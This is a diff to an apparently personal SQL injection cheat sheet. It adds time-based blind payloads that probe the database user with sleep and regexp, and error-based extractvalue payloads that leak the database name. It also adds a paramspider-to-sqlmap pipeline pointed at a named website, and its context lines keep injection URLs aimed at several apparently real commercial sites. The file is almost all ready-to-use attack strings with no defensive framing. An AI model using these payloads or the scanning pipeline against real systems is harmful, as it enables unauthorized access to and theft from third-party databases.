@@ -1,4 +1,4 @@
-# database injection
+# Sql injection
 
 ### DB Interaction
 
@@ -45,6 +45,11 @@ Headers
     https://www.walsall-locks.co.uk/product.php?id=13-IF(length(database())%3E5,sleep(10),1) 
     http://www.oottru.com/job-description.aspx?id=2%20IF(SUBSTRING(db_name(),1,1)=%27d%27)%20WAITFOR%20DELAY%20%270:0:10%27     
     http://www.senghup.com.my/product.php?id=11%27-IF(MID((SELECT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%200,1),1,1)=%27i%27,sleep(10),1)%23
+    
+    '| if((substr(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) |' -> root ->    ?^[m-z] -> 26 
+    '& if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) &'
+    'OR if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) OR'
+    'AND if((MID(user(),1,1) regexp 0x5e5b6d2d7a5d), sleep(5), 1) AND'
 ```
 
 ### HPP (HTTP Parameter Pollution)
@@ -111,5 +116,22 @@ http://www.senghup.com.my/product.php?id=-10%27%20UNION%20SELECT%201,2,schema_na
 ### Error-Based
 
 ```
-extractvalue(1 ,/a/b/text()) -> XPATH SYNTAX ERROR: QUERY RESULT 
+        ' or extractvalue(1,concat(0x7e,database())) or '
+        ' AND extractvalue(1,concat(0x7e,database())) AND '
+        '| extractvalue(1,concat(0x7e,database())) |'
+        '& extractvalue(1,concat(0x7e,database())) &'
+```
+
+### Second-Order Injection
+
+INSERT|UPDATE -> SELECT
+
+### Automation sql injection
+
+```
+    1) SQLMAP -> crawl + cookie 
+    2) SQLMAP + Burp -> SQLipy
+    3) wayback 
+        python3 paramspider.py -d http://shukomonmouth.co.uk/ -s TRUE -e woff,ttf,eot,svg | deduplicate --sort | httpx -silent | sqlmap
+    4) Manual 
 ```
